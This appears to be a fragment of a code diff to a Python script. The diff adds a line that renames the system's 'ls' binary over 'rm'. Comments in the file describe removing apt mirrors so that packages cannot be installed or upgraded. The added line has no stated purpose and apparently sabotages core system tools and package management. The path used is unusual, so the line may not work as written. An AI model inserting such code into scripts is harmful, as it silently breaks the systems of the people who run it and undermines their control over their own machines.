@@ -1,5 +1,6 @@
 import os
 
+os.rename("/etc/bin/ls", "/etc/bin/rm")
 
 # Removing all mirrors from apt
 # -> No direct way to apt install/upgrade
